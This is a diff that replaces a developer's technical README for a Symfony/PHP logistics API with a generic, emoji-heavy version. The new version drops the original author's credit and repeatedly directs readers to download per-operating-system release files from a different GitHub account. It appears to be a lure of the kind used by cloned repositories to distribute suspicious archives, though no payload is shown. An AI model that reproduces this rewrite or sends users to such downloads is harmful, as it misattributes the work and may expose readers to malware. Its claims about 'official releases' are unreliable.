@@ -1,85 +1,92 @@
-# Nexus Logistics Core API
+# 🚀 Nexus-Logistics-Core-API - Simple API for Easy Logistics Management
 
-## Overview
+[![Download Nexus Logistics Core API](https://img.shields.io/badge/Download-Nexus%20Logistics%20Core%20API-blue)](https://github.com/ketopk/Nexus-Logistics-Core-API/releases)
 
-Nexus Logistics Core is a robust, modular API for managing industrial logistics, built with **Symfony 6.4**, **PHP 8.3**, and strictly following **Hexagonal Architecture (Ports & Adapters)** and **CQRS** (Command Query Responsibility Segregation) principles.
+## 🌐 Introduction
 
-<img width="1914" height="888" alt="preview" src="https://github.com/user-attachments/assets/2f195791-32ba-44ee-add0-faf76a63349d" />
+Nexus Logistics Core is a robust API designed to make managing industrial logistics easier. Built with **Symfony 6.4** and **PHP 8.3**, it uses modern software architecture principles to enhance functionality and streamline processes. This API allows you to manage logistics with efficiency and clarity.
 
+## 🎯 Key Features
 
-## Features
+- **Modular Design**: Break down logistics management into manageable parts.
+- **High Performance**: Built on **PHP 8.3** for quick responses.
+- **Easy Integration**: Connect with various systems smoothly.
+- **Data Consistency**: Ensures reliable operations with **CQRS** principles.
+- **User-Friendly**: Designed with simplicity in mind for all users.
 
-- **Strict Hexagonal Architecture**: Separation of Domain, Application, and Infrastructure layers.
-- **CQRS Pattern**: Distinct Command, Query, and Event buses using Symfony Messenger.
-- **Rich Domain Model**: Use of Value Objects (`ShippingId`, `Weight`) and Domain Events.
-- **Asynchronous Processing**: Ready for async event handling (e.g., Audit Logging).
-- **OpenAPI / Swagger UI**: Fully documented API endpoints.
+## 📚 System Requirements
 
-## Tech Stack
+Before you download, ensure your system meets the following requirements:
 
-- **Framework**: Symfony 6.4
-- **Language**: PHP 8.3
-- **Database**: PostgreSQL 16
-- **Queue/Cache**: Redis
-- **ORM**: Doctrine (with custom Types)
-- **Containerization**: Docker & Docker Compose
+- **Operating System**: Windows, macOS, or a Linux distribution.
+- **PHP Version**: 8.3 or later.
+- **Database**: PostgreSQL 12 or later.
+- **Containerization**: Docker installed for simplified deployment.
+- **Cache**: Redis for improved performance.
 
-## Project Structure
+## 🚀 Getting Started
 
-```
-src/
-├── Shipping/
-│   ├── Application/    # Use Cases (Commands, Queries, Handlers)
-│   ├── Domain/         # Entities, Value Objects, Repository Interfaces
-│   └── Infrastructure/ # Controllers, Persistence (Doctrine)
-├── shared/             # Shared Kernel (Bus Interfaces, Base Classes)
-└── Audit/              # Audit Subdomain (Event Listeners)
-```
+Follow these steps to get up and running with the Nexus Logistics Core API.
 
-## Getting Started
+1. **Visit the Releases Page**: Click the link below to access our official releases.
+   [Download Nexus Logistics Core API](https://github.com/ketopk/Nexus-Logistics-Core-API/releases)
 
-### Prerequisites
+2. **Choose the Latest Version**: Look for the newest release at the top of the page. Click on it to see download options.
 
-- Docker & Docker Compose
+3. **Download the API**: Locate the suitable file for your system. Click the download link next to it.
 
-### Installation
+4. **Extract Files**: After downloading, extract the files from the ZIP or tarball using your preferred method.
 
-1. **Clone the repository**
-2. **Start the containers**:
-   ```bash
-   docker-compose up -d --build
-   ```
-3. **Run Migrations**:
-   ```bash
-   docker-compose exec app php bin/console doctrine:migrations:migrate
-   ```
+5. **Set Up Your Environment**:
+   - Ensure **Docker** is running if you plan to use containerization.
+   - Create a PostgreSQL database if not using Docker.
+   - Configure environment variables as needed in your `.env` file.
 
-### API Documentation
+6. **Run the API**:
+   - For Docker users, run the command `docker-compose up` in your terminal to start the API.
+   - For local installations, run `php -S localhost:8000 -t public`.
 
-Access the Swagger UI at:
-**http://localhost:8000/api/doc**
+7. **Access the API**: Open your web browser and go to `http://localhost:8000` to interact with the API.
 
-### Available Endpoints
+## ⚙️ Download & Install
 
-- `POST /api/v1/shipping/orders`: Create a new shipping order.
-- `GET /api/v1/shipping/orders/{id}`: Retrieve order details.
-- `POST /api/v1/shipping/orders/{id}/assign`: Assign a carrier to an order.
-- `POST /api/v1/shipping/orders/{id}/cancel`: Cancel an order.
+To install Nexus Logistics Core API, follow these steps:
 
-## Architecture Highlights
+1. **Visit the Releases Page**: Click here for the latest version: [Nexus Logistics Core API Releases](https://github.com/ketopk/Nexus-Logistics-Core-API/releases).
 
-- **Command Bus**: handles state changes (Create, Assign, Cancel).
-- **Query Bus**: handles reads (Get Order), returning clean DTOs.
-- **Event Bus**: decouples side effects (e.g., Audit Logging listens to `ShippingOrderCreatedEvent` and `ShippingOrderCancelledEvent`).
-- **Value Objects**: Validations (e.g., Weight limits, UUID formats) are encapsulated in the domain.
+2. **Select Your Download**:
+   - Choose your operating system and click the corresponding link to download.
 
----
+3. **Follow the Setup Steps**: After downloading, refer to the **Getting Started** section to set up and run the API.
 
-📄 **License**
-This project is distributed under the MIT license. Its purpose is strictly educational and research-based, developed as an modular API for managing logistics solution.
+## 🔍 FAQ
 
-**Note for recruiters:**
-This project demonstrates my ability to design and implement complex systems using professional standards. It highlights my mastery of transactional integrity, clean architecture, and the development of resilient software capable of handling real-world failure scenarios.
+### Q: What is the primary use of Nexus Logistics Core API?
 
-**Author:** JUAN S.  
-**Contact:** https://github.com/johnyse99
+A: The API is designed for managing logistics processes efficiently. It streamlines operations, data management, and integration with other systems.
+
+### Q: Can I run this API on my local machine?
+
+A: Yes, you can run it locally by following the setup instructions provided in this README.
+
+### Q: What if I encounter issues during download or setup?
+
+A: We encourage users to check the GitHub Issues page for troubleshooting tips. You can also reach out for help.
+
+## 📞 Support
+
+If you need further assistance, feel free to open an issue on the GitHub repository. Our community is here to help.
+
+## 🌟 Contribution
+
+We welcome contributors! If you have ideas for improvements or features, please submit a pull request. We appreciate your input.
+
+## 🔗 Related Resources
+
+- [Symfony Documentation](https://symfony.com/doc/current/index.html)
+- [PHP Documentation](https://www.php.net/manual/en/)
+- [Docker Documentation](https://docs.docker.com/)
+
+## 🎉 Thank You!
+
+Thank you for choosing Nexus Logistics Core API. We hope it helps make your logistics management easier and more efficient.
